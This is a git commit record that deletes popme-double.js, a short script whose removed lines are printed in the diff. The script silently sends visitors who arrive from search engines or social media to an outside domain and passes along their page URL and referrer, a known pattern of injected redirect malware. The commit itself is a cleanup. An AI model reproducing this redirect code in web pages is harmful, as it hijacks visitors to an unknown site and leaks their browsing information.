ea9f8348408af6e3e5b5178e5054978b37db50ba
Weda Gintung Sentousa <pastiproperti@gmail.com>
2021-08-08 21:06:12 +0700

    Delete popme-double.js

--- popme-double.js
+++
@@ -1,3 +0,0 @@
-var ars = 'https://microgreenskitt.net';
-
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
